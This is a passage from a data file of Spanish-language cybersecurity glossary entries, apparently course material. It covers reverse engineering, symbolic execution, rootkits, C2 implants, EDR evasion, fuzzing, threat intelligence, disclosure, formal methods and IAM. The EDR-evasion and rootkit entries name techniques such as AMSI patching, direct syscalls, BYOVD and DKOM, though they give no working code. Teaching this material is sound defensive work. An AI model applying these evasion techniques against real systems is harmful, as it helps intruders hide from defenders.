      "> ⚠️ Confiar ciegamente en 'está en un enclave, es seguro' es un error: el enclave también se audita.",
    examples: [
      "Foreshadow (L1TF) extrayendo secretos de un enclave SGX.",
      "Un bug de memoria dentro del enclave que lo compromete igual.",
    ],
    related: ["TEEs y confidential computing", "Spectre y Meltdown", "Root of trust"],
  },

  // ── M75 · Reverse Engineering Avanzado ───────────────────────────────────
  {
    id: 780,
    module: 75,
    term: "RE workflow avanzado",
    short: "El método maduro: triage rápido, foco en la lógica clave, no leer todo línea a línea.",
    detail:
      "Un RE eficiente sigue un **workflow**: triage (hashes, strings, imports), localizar funciones de interés, decompilar y **anotar** (tipos, nombres), correlacionar estático y dinámico, y documentar hipótesis. La meta no es entender todo, sino la **lógica relevante** (config de C2, rutina de cifrado, anti-análisis).\n" +
      "> 💡 Renombrar y tipar en el decompilador transforma 100 líneas ilegibles en algo leíble.",
    examples: [
      "Triagear con `file`/`strings`/`yara` antes de abrir Ghidra.",
      "Anotar tipos de struct para que el decompilador genere C limpio.",
    ],
    related: ["Anti-análisis y obfuscación", "Deobfuscación", "Tooling (Ghidra/Frida/Unicorn)"],
  },
  {
    id: 781,
    module: 75,
    term: "Anti-análisis y obfuscación",
    short: "El malware se defiende: detecta VMs, depuradores y se ofusca para que no lo leas.",
    detail:
      "Técnicas comunes de **anti-análisis**:\n" +
      "• **Anti-debug** — `IsDebuggerPresent`, timing checks, excepciones.\n" +
      "• **Anti-VM** — buscar artefactos de VirtualBox/VMware/sandboxes.\n" +
      "• **Anti-disassembly** — saltos calculados, basura entre instrucciones.\n" +
      "• **Ofuscación** — strings cifrados, control flow flattening, packers.\n" +
      "> ⚠️ Saltarse el anti-análisis a mano (parchear el binario, hookear APIs) es paso uno.",
    examples: [
      "Parchear `IsDebuggerPresent` para que siempre devuelva 0.",
      "Strings descifrados al vuelo que no aparecen con `strings`.",
    ],
    related: ["Deobfuscación", "Unpacking y deofuscación", "Tooling (Ghidra/Frida/Unicorn)"],
  },
  {
    id: 782,
    module: 75,
    term: "Deobfuscación",
    short: "Revertir la ofuscación: scripts, emulación parcial y análisis de patrones.",
    detail:
      "**Deobfuscar** es revertir capas: descifrar strings, aplanar control flow, identificar **virtualization-based obfuscation** (VMProtect, Themida) y reconstruir la lógica original. Combina **scripting** en el decompilador (Ghidra/IDA), **emulación** (Unicorn) para tramos concretos y **patrón sobre patrón**.\n" +
      "> 💡 Para strings cifrados, escribir un script que invoque el mismo desencriptor revela todo el catálogo de una vez.",
    examples: [
      "Script de Ghidra que descifra todas las strings de una familia.",
      "Emular con Unicorn una rutina ofuscada para ver su salida.",
    ],
    related: ["Anti-análisis y obfuscación", "Tooling (Ghidra/Frida/Unicorn)", "Ejecución simbólica"],
  },
  {
    id: 783,
    module: 75,
    term: "Tooling (Ghidra/Frida/Unicorn)",
    short: "Estático (Ghidra), dinámico instrumentado (Frida) y emulación (Unicorn) — combinados.",
    detail:
      "Trío estrella del RE moderno:\n" +
      "| Herramienta | Para qué |\n" +
      "|---|---|\n" +
      "| Ghidra / IDA | Disasm + decompiler + scripting |\n" +
      "| Frida | Hookear funciones en runtime (móvil, desktop) |\n" +
      "| Unicorn | Emular CPU sin SO (deobf, prototipos) |\n" +
      "> 💡 Frida cambió el RE de apps móviles: hookear sin recompilar la app.",
    examples: [
      "Frida script que loguea cada llamada a `decrypt_string`.",
      "Unicorn ejecutando una rutina aislada con memoria controlada.",
    ],
    related: ["RE workflow avanzado", "Deobfuscación", "Ejecución simbólica"],
  },

  // ── M76 · Ejecución Simbólica y Concólica ────────────────────────────────
  {
    id: 790,
    module: 76,
    term: "Ejecución simbólica",
    short: "Ejecutar el programa con valores 'simbólicos' para explorar todos los caminos posibles.",
    detail:
      "En vez de correr el programa con datos concretos, la **ejecución simbólica** trata la entrada como una **variable** y, en cada rama, acumula **restricciones** sobre ella. Un **SMT solver** luego resuelve qué entrada llega a un punto dado — útil para **encontrar bugs** o **resolver retos** automáticamente.\n" +
      "> 💡 Ideal para hallar la entrada que dispara una rama 'oculta' (clave correcta, payload trigger).",
    examples: [
      "Resolver el reto 'introduce la clave correcta' sin reverse manual.",
      "Hallar la entrada que provoca un buffer overflow.",
    ],
    related: ["angr", "Concólica (DSE)", "Aplicaciones y límites del simbólico"],
  },
  {
    id: 791,
    module: 76,
    term: "angr",
    short: "El framework de ejecución simbólica más usado en seguridad — Python, abierto.",
    detail:
      "**angr** es el framework de referencia para análisis simbólico de binarios: carga el binario, simula su CPU y memoria, propaga símbolos y conecta con **Z3** para resolver restricciones. Se usa para CTFs, fuzzing dirigido y vuln research.\n" +
      "import angr\n" +
      "proj = angr.Project('./bin')\n" +
      "sm = proj.factory.simulation_manager(state)\n" +
      "sm.explore(find=0x400abc)",
    examples: [
      "angr explorando hasta una llamada a `puts(\"win\")`.",
      "Resolver un crackme en pocas líneas de Python.",
    ],
    related: ["Ejecución simbólica", "Concólica (DSE)", "Vulnerability research mindset"],
  },
  {
    id: 792,
    module: 76,
    term: "Concólica (DSE)",
    short: "Mezcla 'concreta + simbólica': se ejecuta de verdad y se acumulan restricciones a la vez.",
    detail:
      "La **ejecución concólica** (*concolic = concrete + symbolic*, o **DSE**: Dynamic Symbolic Execution) ejecuta con valores **reales** pero traza simbólicamente las restricciones. Resuelve mejor el problema del **path explosion** y maneja entornos complejos (syscalls, libs externas).\n" +
      "> 💡 Es lo que usan internamente fuzzers modernos (KLEE, SAGE) para dirigir la exploración.",
    examples: [
      "Un fuzzer que usa DSE para inventar entradas que cubran nuevas ramas.",
      "Explorar un binario real (con libc) sin modelar todo simbólicamente.",
    ],
    related: ["Ejecución simbólica", "angr", "Vulnerability research mindset"],
  },
  {
    id: 793,
    module: 76,
    term: "Aplicaciones y límites del simbólico",
    short: "Excelente para retos y código acotado; sufre con criptografía, loops y código enorme.",
    detail:
      "El simbólico/concólico brilla en **vuln research**, **deobfuscación**, **CTFs** y **fuzzing dirigido**. Sus límites: **path explosion** (caminos crecen exponencialmente), **cripto** (las restricciones se vuelven intratables), **loops** sin cota, y **entornos** complejos (sockets, kernel).\n" +
      "> ⚠️ Por eso se combina con fuzzing tradicional, no lo reemplaza.",
    examples: [
      "Resolver un crackme en minutos vs horas de reverse manual.",
      "Renunciar a explorar simbólicamente una rutina de descifrado AES.",
    ],
    related: ["Ejecución simbólica", "Concólica (DSE)", "Fuzzing coverage-guided"],
  },

  // ── M77 · Rootkits y Bootkits ────────────────────────────────────────────
  {
    id: 800,
    module: 77,
    term: "Tipos de rootkit",
    short: "Userland, kernel, hipervisor, firmware: cada nivel da más sigilo y permisos.",
    detail:
      "Un **rootkit** oculta su presencia y la del atacante. Se clasifican por **dónde viven**:\n" +
      "| Nivel | Privilegio | Detección |\n" +
      "|---|---|---|\n" +
      "| Userland | Bajo | Más fácil (EDR lo ve) |\n" +
      "| Kernel | Total | Muy difícil |\n" +
      "| Hipervisor | Sobre el SO | Casi invisible |\n" +
      "| Firmware/UEFI | Pre-SO | Sobrevive al formateo |\n" +
      "> 💡 Cuanto más bajo, más sigiloso — y más caro de desarrollar.",
    examples: [
      "Un LD_PRELOAD trojan (userland) ocultando procesos.",
      "Un bootkit UEFI persistente (LoJax) tras reinstalar el SO.",
    ],
    related: ["Técnicas userland", "Rootkits de kernel", "Bootkits y detección"],
  },
  {
    id: 801,
    module: 77,
    term: "Técnicas userland",
    short: "Hookear funciones de librería: el rootkit vive en cada proceso, sin tocar el kernel.",
    detail:
      "En userland el rootkit intercepta llamadas a **librerías** (libc, ntdll) para ocultar archivos, procesos y conexiones. Vectores: **LD_PRELOAD** (Linux), **DLL injection / hijacking** (Windows), **IAT/EAT hooking**.\n" +
      "> ⚠️ Son los más comunes; un EDR moderno los detecta por sus hooks anómalos.",
    examples: [
      "LD_PRELOAD que sobrescribe `readdir` para ocultar archivos.",
      "Una DLL inyectada en explorer.exe que filtra procesos del Task Manager.",
    ],
    related: ["Tipos de rootkit", "Rootkits de kernel", "Defender, AMSI y ETW"],
  },
  {
    id: 802,
    module: 77,
    term: "Rootkits de kernel",
    short: "Cargar un driver malicioso da control absoluto y ocultación profunda.",
    detail:
      "Un rootkit de **kernel** (módulo o driver firmado) opera en ring 0: modifica la **SSDT** (Windows), engancha syscalls, **DKOM** (Direct Kernel Object Manipulation) para ocultar procesos del propio kernel. Privilegio total y muy difícil de detectar desde userland.\n" +
      "> ⚠️ Windows exige drivers **firmados**; los atacantes recurren a **BYOVD** (Bring Your Own Vulnerable Driver) o roban firmas legítimas.",
    examples: [
      "DKOM para sacar un proceso de la lista del kernel — invisible a `tasklist`.",
      "BYOVD: cargar un driver legítimo vulnerable para escalar a kernel.",
    ],
    related: ["Tipos de rootkit", "Bootkits y detección", "Kernel vs user space"],
  },
  {
    id: 803,
    module: 77,
    term: "Bootkits y detección",
    short: "Infectar el arranque para cargarse antes que el SO; se detectan por measurement/firma.",
    detail:
      "Un **bootkit** infecta el **arranque** (MBR, bootloader, UEFI) para correr **antes que el SO** — el rootkit ideal. Defensa: **Secure Boot** (rechaza firmas no confiables) y **measured boot + TPM** (no impide arrancar, pero la attestation **delata** el cambio).\n" +
      "> 💡 Detectar bootkits desde el SO comprometido es casi imposible: hace falta arrancar desde medios externos o usar attestation.",
    examples: [
      "BlackLotus (2023): primer bootkit UEFI que evade Secure Boot.",
      "Remote attestation que detecta el bootkit comparando PCRs del TPM.",
    ],
    related: ["Rootkits de kernel", "Ataques de firmware", "TPM y attestation"],
  },

  // ── M78 · Implants, C2 y Evasión de EDR ──────────────────────────────────
  {
    id: 810,
    module: 78,
    term: "Implants modernos",
    short: "Beacons sigilosos en memoria, no en disco — eluden el AV clásico.",
    detail:
      "Un **implante** moderno (beacon de Cobalt Strike, Sliver, Mythic) corre **en memoria**, no toca disco, se comunica con su C2 por canales legítimos y **rota** sus huellas. Pequeño, modular, y cargado mediante **shellcode** o **DLL injection** desde un loader.\n" +
      "> 💡 'Beacon' = sigiloso: contacta al C2 cada X minutos con jitter, no en streaming.",
    examples: [
      "Beacon de Cobalt Strike inyectado en explorer.exe vía process hollowing.",
      "Sliver corriendo solo en memoria, sin payload en disco.",
    ],
    related: ["Command and Control (C2)", "Evasión de EDR", "PowerShell ofensivo"],
  },
  {
    id: 811,
    module: 78,
    term: "Evasión de EDR",
    short: "Romper los hooks del EDR sin que se entere: unhook, syscalls directas, parchear ETW/AMSI.",
    detail:
      "Los EDR observan el SO con **hooks** en userland (en ntdll) y **ETW**/**AMSI**. La evasión:\n" +
      "• **Unhooking** — restaurar las bytes originales de ntdll.\n" +
      "• **Direct syscalls** — invocar el kernel saltando ntdll.dll.\n" +
      "• **Patch AMSI/ETW** — neutralizar los pipes de visibilidad.\n" +
      "• **BYOVD** — usar un driver vulnerable para apagar el EDR desde kernel.\n" +
      "> ⚠️ Tamper Protection y soluciones que viven en kernel (no solo userland) frenan muchas de estas técnicas.",
    examples: [
      "Hells Gate para resolver syscalls dinámicamente sin ntdll.",
      "Patch de `AmsiScanBuffer` para que siempre devuelva 'limpio'.",
    ],
    related: ["Implants modernos", "Command and Control (C2)", "Defender, AMSI y ETW"],
  },
  {
    id: 812,
    module: 78,
    term: "Command and Control (C2)",
    short: "El canal por el que el operador habla con el implante — y donde se delata su beaconing.",
    detail:
      "El **C2** orquesta a los implantes. Canales: **HTTP/S** (con dominio fronting o CDN), **DNS** (lento pero sigiloso), **mensajería** (Telegram, Discord). Patrones a detectar: **beaconing** regular, **dominios recién registrados**, **JA3** anómalos, **volumen DNS** elevado.\n" +
      "> 💡 Las **C2 matrices** de MITRE listan canales conocidos; un buen SOC monitorea por patrón, no solo por IoC.",
    examples: [
      "Beacon HTTPS cada 60s a un dominio CDN reciente.",
      "DNS tunneling exfiltrando datos en consultas TXT.",
    ],
    related: ["Implants modernos", "Detección y caza de implantes", "Detección de C2 y exfiltración"],
  },
  {
    id: 813,
    module: 78,
    term: "Detección y caza de implantes",
    short: "Cazar lo que el EDR no vio: anomalías de proceso, memoria y red.",
    detail:
      "Detectar un implante sigiloso exige **hunting**: procesos hijos anómalos de Office/navegador, hilos sin módulo (shellcode en memoria), regiones **RWX** en procesos legítimos, **beaconing** en logs DNS/proxy. Herramientas: **Yara en memoria**, **Sigma**, telemetría de **Sysmon**/EDR.\n" +
      "> 💡 'Inyección de shellcode' deja huellas: regiones de memoria ejecutables sin archivo respaldo, threads sospechosos.",
    examples: [
      "Hunting query: procesos con threads cuyo start address no mapea a ningún módulo.",
      "Yara escaneando memoria para hallar beacons conocidos.",
    ],
    related: ["Command and Control (C2)", "Evasión de EDR", "Threat hunting"],
  },

  // ── M79 · Vulnerability Research y Fuzzing ───────────────────────────────
  {
    id: 820,
    module: 79,
    term: "Vulnerability research mindset",
    short: "Buscar bugs no es solo correr herramientas: es modelar el software y atacar sus suposiciones.",
    detail:
      "El **vulnerability research (VR)** combina lectura de código, **modelado de amenaza** (qué confía el software de qué) y herramientas automatizadas. El investigador busca **suposiciones implícitas** rotas: validaciones que se confunden, estados que se solapan, límites mal puestos.\n" +
      "> 💡 La pregunta clave: ¿qué da por sentado el desarrollador que el atacante puede cambiar?",
    examples: [
      "Hallar un bug de parsing al leer un código auditando suposiciones.",
      "Mapear la superficie de ataque antes de tocar fuzzing.",
    ],
    related: ["Fuzzing coverage-guided", "Fuzzing avanzado", "Triage y ciclo del 0-day"],
  },
  {
    id: 821,
    module: 79,
    term: "Fuzzing coverage-guided",
    short: "Inyecta entradas aleatorias y se guía por la cobertura de código para descubrir caminos nuevos.",
    detail:
      "El **fuzzing moderno** (AFL/AFL++, libFuzzer, honggfuzz) **instrumenta** el binario para medir cobertura: cada entrada que **abre una rama nueva** se guarda y se muta. Así explora el código de forma dirigida, mucho más eficaz que el fuzzing ciego.\n" +
      "afl-fuzz -i seeds/ -o out/ -- ./target @@\n" +
      "> 💡 Es la técnica que destapó miles de CVEs (oss-fuzz lleva ~10.000 bugs en proyectos open source).",
    examples: [
      "AFL++ encontrando un crash en un parser de imágenes.",
      "oss-fuzz integrado en proyectos open source con CI.",
    ],
    related: ["Vulnerability research mindset", "Fuzzing avanzado", "Concólica (DSE)"],
  },
  {
    id: 822,
    module: 79,
    term: "Fuzzing avanzado",
    short: "Diccionarios, harnesses, fuzzing diferencial y feedback de sanitizers para llegar más profundo.",
    detail:
      "Técnicas avanzadas que multiplican la efectividad:\n" +
      "• **Diccionarios y grammars** — para formatos estructurados (JSON, ASN.1).\n" +
      "• **Harnesses** — código que expone la API objetivo al fuzzer.\n" +
      "• **Sanitizers** (**ASan**, **UBSan**, **MSan**) — detectan bugs invisibles al crash.\n" +
      "• **Fuzzing diferencial** — comparar dos implementaciones del mismo protocolo.\n" +
      "• **Snapshot/coverage-guided híbrido** + **concolic** para romper cuellos de botella.",
    examples: [
      "Un harness para fuzzear la librería de parsing TLS.",
      "ASan detectando un heap UAF que el programa no crashea.",
    ],
    related: ["Fuzzing coverage-guided", "Vulnerability research mindset", "Triage y ciclo del 0-day"],
  },
  {
    id: 823,
    module: 79,
    term: "Triage y ciclo del 0-day",
    short: "Del crash al CVE: deduplicar, evaluar explotabilidad, escribir PoC, reportar y publicar.",
    detail:
      "Un crash no es un 0-day; hay que **triagear**: deduplicar (¿es nuevo?), **clasificar** la causa raíz (UAF/OOB/overflow), evaluar **explotabilidad**, escribir un **PoC mínimo**, hacer **disclosure responsable** al vendor y obtener un **CVE**. Solo entonces se publica.\n" +
      "> 💡 Ver el diagrama 'Ciclo del 0-day' con cada etapa y su buena práctica.",
    examples: [
      "Reducir un fuzz crash de 4 MB a un PoC de 200 bytes.",
      "90 días de embargo coordinado antes de publicar el detalle.",
    ],
    related: ["Fuzzing avanzado", "Responsible disclosure", "CVE y CVSS"],
  },

  // ── M80 · Threat Intelligence y APT Tracking ─────────────────────────────
  {
    id: 830,
    module: 80,
    term: "Fundamentos de CTI",
    short: "Convertir datos crudos sobre amenazas en conocimiento que orienta decisiones de defensa.",
    detail:
      "La **Cyber Threat Intelligence** trabaja en 4 niveles:\n" +
      "| Nivel | Audiencia | Contenido |\n" +
      "|---|---|---|\n" +
      "| Estratégico | Dirección | Tendencias, geopolítica |\n" +
      "| Operacional | CISO/Líderes | Campañas específicas |\n" +
      "| Táctico | SOC/IR | TTPs |\n" +
      "| Técnico | Engineers | IoCs |\n" +
      "> 💡 CTI sin acción es solo noticias; debe **mover** detección, parcheo o priorización.",
    examples: [
      "Un reporte que justifica acelerar el parcheo de una CVE.",
      "Boletines de campañas activas contra el sector financiero.",
    ],
    related: ["Frameworks (Diamond, ATT&CK)", "APT tracking", "Operacionalizar (STIX/TAXII)"],
  },
  {
    id: 831,
    module: 80,
    term: "Frameworks (Diamond, ATT&CK)",
    short: "Modelos para describir adversarios: Diamond para atribuir, ATT&CK para mapear TTPs.",
    detail:
      "• **Diamond Model** — describe un evento por 4 vértices: **adversario**, **capacidad** (malware/TTP), **infraestructura** (C2/dominios) y **víctima**. Conectar eventos por vértices compartidos atribuye campañas.\n" +
      "• **MITRE ATT&CK** — catálogo de TTPs por táctica; la lingua franca para mapear detecciones y reportes.\n" +
      "> 💡 Diamond para narrar lo que pasó; ATT&CK para enlazarlo con detección/defensa.",
    examples: [
      "Mapear un IR a ATT&CK para identificar gaps de detección.",
      "Diamond conectando dos incidentes vía la misma infraestructura.",
    ],
    related: ["Fundamentos de CTI", "APT tracking", "MITRE ATT&CK"],
  },
  {
    id: 832,
    module: 80,
    term: "APT tracking",
    short: "Seguir a grupos persistentes: TTPs, infraestructura, motivaciones — más allá del IoC.",
    detail:
      "Los **APT** (*Advanced Persistent Threats*) son grupos organizados (estatales o crimeware) con objetivos sostenidos. El tracking sigue sus **TTPs** (lo más difícil de cambiar — Pirámide del Dolor), su **infraestructura** y sus **víctimas/motivos**. Las atribuciones suelen tener **alias** (APT28/Fancy Bear, Lazarus) y **confianza graduada** (probable, alta).\n" +
      "> ⚠️ Atribuir es difícil: los grupos imitan TTPs ajenos (false flags) para confundir.",
    examples: [
      "Atribuir una campaña a APT41 por el reuso de un loader único.",
      "Compartir IoCs y reportes vía MISP entre equipos.",
    ],
    related: ["Frameworks (Diamond, ATT&CK)", "Operacionalizar (STIX/TAXII)", "Actor de amenaza"],
  },
  {
    id: 833,
    module: 80,
    term: "Operacionalizar (STIX/TAXII)",
    short: "Estándares para compartir CTI máquina-a-máquina: STIX (formato) + TAXII (transporte).",
    detail:
      "• **STIX** — formato JSON estandarizado para describir IoCs, TTPs, actores, malware, relaciones.\n" +
      "• **TAXII** — protocolo HTTPS para distribuir feeds STIX entre organizaciones (consumir/publicar).\n" +
      "• **MISP** — plataforma open source para crear comunidades de intercambio.\n" +
      "> 💡 Sin estándares, cada equipo reinventa el formato; con STIX/TAXII, la CTI fluye automáticamente.",
    examples: [
      "Suscribirse al feed TAXII de un ISAC sectorial.",
      "Publicar un evento MISP con IoCs y TTPs de una campaña.",
    ],
    related: ["Fundamentos de CTI", "APT tracking", "Indicadores de compromiso (IoC)"],
  },

  // ── M81 · Metodología de Security Research ───────────────────────────────
  {
    id: 840,
    module: 81,
    term: "Hacer investigación en seguridad",
    short: "Una mezcla de ingeniería, ciencia y comunicación: hipótesis, experimentación, publicación.",
    detail:
      "La **research** seria es más que 'rompí algo': formular una **pregunta** clara, una **hipótesis** comprobable, experimentar de forma **reproducible**, **medir** y **publicar** con honestidad sobre límites. Combina ingeniería (montar el setup), ciencia (rigor) y comunicación (que se entienda).\n" +
      "> 💡 Pregunta motora: ¿qué afirmación verificable estoy probando o refutando?",
    examples: [
      "Una hipótesis: 'la mitigación X no resiste el ataque Y'.",
      "Reproducir un trabajo publicado para validar sus claims.",
    ],
    related: ["Responsible disclosure", "Ecosistema CVE/CVSS", "Comunicar (papers, PoCs, charlas)"],
  },
  {
    id: 841,
    module: 81,
    term: "Responsible disclosure",
    short: "Avisar al vendor primero, dar tiempo a parchear, publicar coordinado para minimizar daño.",
    detail:
      "El **responsible (coordinated) disclosure** equilibra el derecho del usuario a saber con el riesgo de armar al atacante. El estándar de facto: **90 días** (Google Project Zero) o **45/60/90** según gravedad y respuesta. Si el vendor ignora, se publica igual.\n" +
      "> ⚠️ Lo opuesto: **full disclosure** inmediato (presiona pero pone usuarios en riesgo) o **vender** el bug (gris/negro).",
    examples: [
      "Reportar a security@ del vendor con PoC y deadline.",
      "Coordinar la publicación con el día del parche.",
    ],
    related: ["Hacer investigación en seguridad", "Ecosistema CVE/CVSS", "Triage y ciclo del 0-day"],
  },
  {
    id: 842,
    module: 81,
    term: "Ecosistema CVE/CVSS",
    short: "CVE asigna un id global; CVSS lo puntúa; CNAs emiten los CVEs.",
    detail:
      "Cuando se reporta un bug:\n" +
      "• Un **CNA** (*CVE Numbering Authority*: vendor, MITRE, ZDI) **asigna** un **CVE-YYYY-NNNN**.\n" +
      "• Se calcula un **CVSS** (vector y score 0-10).\n" +
      "• Si está siendo explotado, suele entrar en la **CISA KEV** (Known Exploited Vulnerabilities).\n" +
      "> 💡 Pedir un CVE temprano formaliza el bug y facilita parches/comunicación.",
    examples: [
      "Solicitar un CVE a MITRE si el vendor no es CNA.",
      "Una vuln en KEV pasa al top de la cola de parcheo.",
    ],
    related: ["CVE y CVSS", "Responsible disclosure", "Hacer investigación en seguridad"],
  },
  {
    id: 843,
    module: 81,
    term: "Comunicar (papers, PoCs, charlas)",
    short: "El trabajo no existe hasta que otros pueden leerlo, reproducirlo y construir encima.",
    detail:
      "Vehículos de difusión: **papers académicos** (USENIX, IEEE S&P), **blog posts** técnicos, **PoCs** en GitHub, **charlas** (Black Hat, DEF CON, Offensive Con). El reto es contar **suficiente** para que se entienda y se reproduzca, sin **armar** a actores oportunistas más allá de lo necesario.\n" +
      "> 💡 Un buen writeup explica el camino mental, no solo el exploit.",
    examples: [
      "Un paper con setup reproducible y código publicado.",
      "Un PoC que dispara una alerta pero no daña producción.",
    ],
    related: ["Hacer investigación en seguridad", "Responsible disclosure", "Portfolio y carrera"],
  },

  // ── M82 · Formal Methods y Verificación ──────────────────────────────────
  {
    id: 850,
    module: 82,
    term: "Por qué formal methods",
    short: "Probar matemáticamente que el software cumple una propiedad — no solo testearlo.",
    detail:
      "Los **métodos formales** **demuestran** que un sistema cumple una propiedad (no hay overflow, dos hilos no compiten, el protocolo es seguro). Un test prueba que **un caso** funciona; una prueba formal cubre **todos**. Coste alto, pero invaluable en software crítico (kernels, blockchains, criptografía).\n" +
      "> 💡 Donde un bug cuesta vidas o miles de millones, vale el esfuerzo formal.",
    examples: [
      "El microkernel seL4 con código verificado formalmente.",
      "Demostrar que una implementación de TLS cumple su spec.",
    ],
    related: ["Model checking y theorem proving", "Sistemas verificados", "Límites y práctica"],
  },
  {
    id: 851,
    module: 82,
    term: "Model checking y theorem proving",
    short: "Dos familias: explorar exhaustivamente estados (model checking) o demostrar teoremas paso a paso.",
    detail:
      "• **Model checking** — modela el sistema como estados, explora **todos** y verifica una propiedad (TLA+, SPIN). Automático pero limitado por la **explosión de estados**.\n" +
      "• **Theorem proving** — escribe el sistema y la propiedad en una lógica formal y **demuestra** el teorema con asistente (Coq, Isabelle, Lean). Más general, pero requiere experto y mucho tiempo.\n" +
      "> 💡 Para hardware y protocolos: model checking. Para kernel/compiladores: theorem proving.",
    examples: [
      "Verificar un protocolo distribuido con TLA+ y descubrir un edge case.",
      "Demostrar en Coq que un compilador preserva la semántica.",
    ],
    related: ["Por qué formal methods", "Sistemas verificados", "Ejecución simbólica"],
  },
  {
    id: 852,
    module: 82,
    term: "Sistemas verificados",
    short: "Ejemplos reales donde la verificación formal cambió el listón (seL4, CompCert, AWS).",
    detail:
      "Casos emblemáticos:\n" +
      "• **seL4** — primer microkernel funcionalmente verificado (sin bugs en su código).\n" +
      "• **CompCert** — compilador C cuya traducción está demostrada.\n" +
      "• **AWS** — usa TLA+ y SMT para servicios como S3, DynamoDB; halló bugs profundos antes de producción.\n" +
      "• **Blockchains** — contratos formalmente verificados para evitar pérdidas millonarias.",
    examples: [
      "Amazon describiendo cómo TLA+ encontró bugs en S3 antes de release.",
      "Contratos de DeFi verificados con Certora.",
    ],
    related: ["Por qué formal methods", "Model checking y theorem proving", "Límites y práctica"],
  },
  {
    id: 853,
    module: 82,
    term: "Límites y práctica",
    short: "Coste, expertise y modelado: lo formal no escala a todo — se usa donde el riesgo lo justifica.",
    detail:
      "Los métodos formales tienen **límites duros**: coste de tiempo y de experto, **explosión de estados**, dependencia del **modelo** (si modelas mal, la prueba miente), y la brecha entre la **especificación** y la **implementación**. La práctica es **focalizada**: verificar el corazón crítico (cripto, kernel, protocolo) y testear el resto.\n" +
      "> ⚠️ 'Verificado' no implica 'seguro': la spec puede tener huecos o el modelo asumir cosas falsas.",
    examples: [
      "Verificar solo la rutina de validación de firmas, no todo el sistema.",
      "Un bug fuera de la spec verificada que igual causa una vuln.",
    ],
    related: ["Sistemas verificados", "Por qué formal methods", "Hacer investigación en seguridad"],
  },

  // ── M83 · Gestión de Identidades y Accesos (IAM) ─────────────────────────
  {
    id: 860,
    module: 83,
    term: "Ciclo de vida de la identidad",
    short: "Provisioning, cambios y deprovisioning gobernados — para que cada persona tenga solo lo justo en cada momento.",
    detail:
      "El **ciclo de vida JML** (*Joiner-Mover-Leaver*) gobierna cómo nace, evoluciona y se cierra cada identidad:\n" +
      "• **Joiner** — alta con permisos por rol y MFA configurada.\n" +
      "• **Mover** — al cambiar de rol, **revisar y rotar** permisos (no acumular).\n" +
      "• **Leaver** — deshabilitar/borrar y **revocar tokens/sesiones** rápido.\n" +
      "> ⚠️ Las cuentas 'huérfanas' (ex-empleados activos) y la **acumulación de privilegios** de los movers son hallazgos clásicos de auditoría.",
    examples: [
      "Provisioning automático desde RR.HH. → AD/Okta al alta.",
      "Revisión trimestral de accesos (entitlement review).",
    ],
    related: ["AAA (Autenticación, Autorización, Accounting)", "MFA y autenticación moderna", "Autenticación adaptativa / basada en riesgo", "PAM (Privileged Access Management)"],
  },
  {
    id: 861,
    module: 83,
    term: "MFA y autenticación moderna",
    short: "Más allá de la contraseña: TOTP, push, y passkeys/WebAuthn resistentes al phishing.",
    detail:
      "La **MFA** combina factores: algo que sabes (contraseña), algo que tienes (token, móvil), algo que eres (biometría). No todos son iguales:\n" +
      "| Factor | Resistencia a phishing |\n" +
      "|---|---|\n" +
      "| SMS / Push | Baja (interceptable, fatiga) |\n" +
      "| TOTP (Authenticator) | Media |\n" +
      "| WebAuthn / Passkeys (FIDO2) | Alta (ligado al dominio) |\n" +
      "> 💡 Las **passkeys** son la dirección moderna: criptografía asimétrica, sin contraseña, **inmunes al phishing**.",
    examples: [
      "Migrar de SMS a una app TOTP y luego a passkeys.",
      "MFA push con number matching para mitigar fatiga.",
    ],
    related: ["Factores de autenticación", "Passkeys y FIDO2/WebAuthn", "Autenticación passwordless", "Ataques a MFA", "Ciclo de vida de la identidad", "SSO y federación", "Defensas anti-phishing"],
  },
  {
    id: 862,
    module: 83,
    term: "SSO y federación",
    short: "Una identidad, muchas apps: OAuth/OIDC delegan auth, SAML federa entre dominios.",
    detail:
      "El **SSO** (*Single Sign-On*) deja que el usuario inicie sesión una vez y acceda a muchas apps. Los estándares:\n" +
      "• **OAuth 2.0** — delegación de **autorización** (acceso a recursos).\n" +
      "• **OIDC** — capa de **autenticación** sobre OAuth 2.0; el estándar web moderno.\n" +
      "• **SAML** — federación entre dominios (clásico en empresa).\n" +
      "> 💡 SSO reduce contraseñas reusadas y centraliza la auditoría; el IdP comprometido = todo cae.",
    examples: [
      "Login con Google (OIDC) en una app SaaS.",
      "SAML entre el IdP corporativo y aplicaciones internas.",
    ],
    related: ["MFA y autenticación moderna", "Autenticación passwordless", "Modelos de autorización", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 863,
    module: 83,
    term: "Modelos de autorización",
    short: "RBAC asigna por rol; ABAC decide por atributos; el menor privilegio es la regla común.",
    detail:
      "• **RBAC** — permisos asignados a **roles**; el usuario hereda los de su rol. Fácil de gobernar, rígido.\n" +
      "• **ABAC** — política basada en **atributos** (usuario, recurso, contexto). Flexible pero más complejo.\n" +
      "• **ReBAC / PBAC** — variantes basadas en relaciones o políticas declarativas (OPA/Cedar).\n" +
      "> 💡 Sea cual sea el modelo, la regla es **menor privilegio**: dar lo mínimo necesario, por el menor tiempo posible. Ver el diagrama 'Modelos de autorización por capas'.",
    examples: [
      "RBAC: rol 'Editor' permite publicar pero no borrar.",
      "ABAC: 'permitir si user.dept == resource.dept y hora ∈ laboral'.",
    ],
    related: ["Principio de mínimo privilegio", "SSO y federación", "PAM (Privileged Access Management)"],
  },
  {
    id: 864,
    module: 83,
    term: "PAM (Privileged Access Management)",
    short: "Custodia y vigila las cuentas con superpoderes: bóvedas, sesiones grabadas, just-in-time.",
    detail:
      "El **PAM** gestiona las **identidades privilegiadas** (admins, service accounts, root). Funciones clave:\n" +
      "• **Bóveda** de credenciales con rotación automática.\n" +
      "• **Just-in-time access** — privilegios temporales por aprobación, no permanentes.\n" +
      "• **Grabación de sesión** para auditoría forense.\n" +
      "• **Aislamiento** — el admin nunca ve la contraseña real.\n" +
      "> ⚠️ Cuentas admin permanentes y compartidas son uno de los riesgos #1 en cualquier auditoría.",
    examples: [
      "Aprobación de 1h para hacerse admin de un servidor.",
      "Rotación automática de la contraseña de una service account.",
    ],
    related: ["Modelos de autorización", "Principio de mínimo privilegio", "Ciclo de vida de la identidad"],
  },
  {
    id: 865,
    module: 83,
    term: "Factores de autenticación",
    short: "Los ingredientes con los que se prueba una identidad: lo que sabes, tienes, eres, dónde estás y cómo te comportas.",
    detail:
      "Un **factor** es una categoría de evidencia con la que un usuario demuestra su identidad. Los cinco factores modernos:\n" +
      "| # | Factor | Ejemplos | Fortaleza típica |\n" +
      "|---|---|---|---|\n" +
